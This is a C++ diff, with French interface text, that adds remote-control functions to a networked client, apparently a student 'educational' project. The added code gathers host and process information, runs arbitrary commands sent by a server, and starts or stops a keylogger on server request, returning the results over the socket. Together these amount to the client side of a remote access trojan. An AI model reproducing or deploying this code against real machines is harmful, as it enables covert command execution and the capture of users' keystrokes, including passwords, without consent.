@@ -213,3 +213,163 @@ void Client::reset() {
     server_port_ = 0;
     is_connected_ = false;
 }
+
+void Client::run_remote_control_demo() {
+    if (!remote_control_) {
+        remote_control_ = std::make_unique<RemoteControl>();
+    }
+    
+    std::cout << "\n=== DEMO Remote Control Features ===" << std::endl;
+    
+    
+    while (true) {
+        std::cout << "\nCommandes disponibles:" << std::endl;
+        std::cout << "1. host     - Informations système" << std::endl;
+        std::cout << "2. proc     - Liste des processus" << std::endl;
+        std::cout << "3. cmd      - Exécuter une commande" << std::endl;
+        std::cout << "4. keylog   - Test keylogger" << std::endl;
+        std::cout << "5. quit     - Quitter" << std::endl;
+        std::cout << "> ";
+        
+        std::string command;
+        if (!std::getline(std::cin, command)) break;
+        
+        if (command == "host") {
+            HostInfo info = remote_control_->get_host_info();
+            std::cout << "📋 Informations système:" << std::endl;
+            std::cout << "  Hostname: " << info.hostname << std::endl;
+            std::cout << "  Username: " << info.username << std::endl;
+            std::cout << "  OS: " << info.os_name << std::endl;
+            std::cout << "  Version: " << info.os_version << std::endl;
+            std::cout << "  Architecture: " << info.architecture << std::endl;
+            
+        } else if (command == "proc") {
+            auto processes = remote_control_->get_process_list();
+            std::cout << "📋 Processus (" << processes.size() << " total):" << std::endl;
+            for (size_t i = 0; i < std::min(processes.size(), size_t(10)); ++i) {
+                const auto& proc = processes[i];
+                std::cout << "  PID " << proc.pid << ": " << proc.name 
+                         << " (CPU: " << proc.cpu_usage << "%)" << std::endl;
+            }
+            
+        } else if (command == "cmd") {
+            std::cout << "Commande à exécuter: ";
+            std::string cmd;
+            if (std::getline(std::cin, cmd)) {
+                std::string result = remote_control_->execute_command(cmd);
+                std::cout << "📋 Résultat:" << std::endl;
+                std::cout << result << std::endl;
+            }
+            
+        } else if (command == "keylog") {
+            test_keylogger();
+            
+        } else if (command == "quit") {
+            break;
+        } else {
+            std::cout << "Commande inconnue" << std::endl;
+        }
+    }
+}
+
+void Client::test_keylogger() {
+    std::cout << "\n🔍 Test du keylogger (version éducative)" << std::endl;
+   
+    
+    bool started = remote_control_->start_keylogger();
+    if (!started) {
+        std::cout << "❌ Impossible de démarrer le keylogger" << std::endl;
+        return;
+    }
+    
+    std::cout << "✅ Keylogger démarré" << std::endl;
+    std::cout << "📝 Appuyez sur Entrée après quelques secondes pour voir le résultat..." << std::endl;
+    
+    std::string dummy;
+    std::getline(std::cin, dummy);
+    
+    std::string captured = remote_control_->get_captured_keys();
+    std::cout << "📋 Touches capturées:" << std::endl;
+    std::cout << captured << std::endl;
+    
+    bool stopped = remote_control_->stop_keylogger();
+    std::cout << (stopped ? "✅ Keylogger arrêté" : "❌ Erreur lors de l'arrêt") << std::endl;
+}
+
+bool Client::handle_remote_control_request(const LPTF::LPTF_Packet& request) {
+    if (!remote_control_) {
+        remote_control_ = std::make_unique<RemoteControl>();
+    }
+    
+    switch (request.get_message_type()) {
+        case LPTF::MessageType::HOST_INFO_REQUEST:
+            process_host_info_request();
+            break;
+            
+        case LPTF::MessageType::PROCESS_LIST_REQUEST:
+            process_process_list_request();
+            break;
+            
+        case LPTF::MessageType::EXECUTE_COMMAND_REQUEST:
+            process_execute_command_request(request);
+            break;
+            
+        case LPTF::MessageType::KEYLOGGER_START_REQUEST:
+        case LPTF::MessageType::KEYLOGGER_STOP_REQUEST:
+            process_keylogger_request(request);
+            break;
+            
+        default:
+            return false;
+    }
+    
+    return true;
+}
+
+void Client::process_host_info_request() {
+    HostInfo info = remote_control_->get_host_info();
+    LPTF::LPTF_Packet response = remote_control_->create_host_info_response(info);
+    
+    std::vector<uint8_t> data = response.serialize();
+    std::string str_data(data.begin(), data.end());
+    socket_->send_data(str_data);
+}
+
+void Client::process_process_list_request() {
+    std::vector<ProcessInfo> processes = remote_control_->get_process_list();
+    LPTF::LPTF_Packet response = remote_control_->create_process_list_response(processes);
+    
+    std::vector<uint8_t> data = response.serialize();
+    std::string str_data(data.begin(), data.end());
+    socket_->send_data(str_data);
+}
+
+void Client::process_execute_command_request(const LPTF::LPTF_Packet& request) {
+    std::string command = request.get_string("command");
+    std::string output = remote_control_->execute_command(command);
+    
+    LPTF::LPTF_Packet response = remote_control_->create_command_response(output, 0);
+    
+    std::vector<uint8_t> data = response.serialize();
+    std::string str_data(data.begin(), data.end());
+    socket_->send_data(str_data);
+}
+
+void Client::process_keylogger_request(const LPTF::LPTF_Packet& request) {
+    bool success = false;
+    std::string message;
+    
+    if (request.get_message_type() == LPTF::MessageType::KEYLOGGER_START_REQUEST) {
+        success = remote_control_->start_keylogger();
+        message = success ? "Keylogger started" : "Failed to start keylogger";
+    } else {
+        success = remote_control_->stop_keylogger();
+        message = success ? "Keylogger stopped" : "Failed to stop keylogger";
+    }
+    
+    LPTF::LPTF_Packet response = remote_control_->create_keylogger_status_response(success, message);
+    
+    std::vector<uint8_t> data = response.serialize();
+    std::string str_data(data.begin(), data.end());
+    socket_->send_data(str_data);
+}
